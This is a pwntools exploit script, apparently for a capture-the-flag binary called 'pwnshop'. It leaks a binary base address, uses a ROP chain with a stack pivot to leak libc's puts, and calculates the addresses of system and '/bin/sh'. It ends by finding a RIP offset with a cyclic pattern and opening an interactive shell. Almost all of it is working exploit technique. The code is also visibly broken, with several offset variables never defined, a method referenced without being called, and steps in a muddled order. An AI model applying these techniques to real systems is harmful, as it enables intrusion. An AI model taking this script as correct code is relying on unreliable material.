
from pwn import *

context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/pwnshop'

buy_padding = 72

#elf = context.binary = ELF(executable)

log.info('Get Addresses')

#info("%s symbols", elf.symbols)
#info("%s plt", elf.plt)
#info("%s got", elf.got)
#info("%s libs", elf.libs)


log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('get leaked address')

io.sendlineafter('\n> ', '2')
io.sendlineafter('sell? ', 'qq')
leak_padding = b'7' * leak_padding_offset
io.sendlineafter('it? ', leak_padding)

binary_offset = io.recvline().split(leak_padding)[1].split(b'?')[0]
binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
binary_offset = u64(binary_offset, endian='little')
binary_offset -= 0x40c0
log.success(f'Leaked binary offset: {str(hex(binary_offset))}')


"""
log.info('Stack Pivot')

padding_to_rop = b'a' * rop_padding_offset
sell_function = p64(0x126a + binary_offset)

rop_chain = sell_function + sell_function
padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
sub_rsp = p64(0x1219 + binary_offset)

payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
print(payload)

io.sendlineafter('\n> ', '1')
io.sendafter('Enter details: ', payload)
"""

log.info('leaking LIBC address with stack pivot')

got_puts = p64(binary_offset + 0x4018)
plt_puts = p64(binary_offset + 0x1030)
pop_rdi = p64(binary_offset + 0x13c3)
buy_function = p64(binary_offset + 0x132a)
padding_to_rop = b'a' * rop_padding_offset

rop_chain = pop_rdi + got_puts + plt_puts + buy_function
padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
sub_rsp = p64(0x1219 + binary_offset)

payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
print(payload)

io.sendlineafter('\n> ', '1')
io.sendafter('Enter details: ', payload)

leaked_puts_libc = io.recvline[:6]
leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
leaked_puts_libc = u64(leaked_puts_libc, endian='little')
log.success(f'Leaked puts@GLIBCL offset: {str(hex(leaked_puts_libc))}')


log.info('find offsets in libc')
libc_puts = 0x765f0
libc_system = 0x48e50
libc_sh = 0x18a156

libc_offset = leaked_puts_libc - libc_puts

system = p64(libc_offset + libc_system)
log.info(f'Calculated System Location: {str(hex(u64(system)))}')
sh = p64(libc_offset + libc_sh)
log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')



log.info('Send Command')
io.sendlineafter('>', '1')

payload = cyclic(200)

log.info('Send Payload')
io.sendlineafter('details: ', payload)

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

io.interactive()

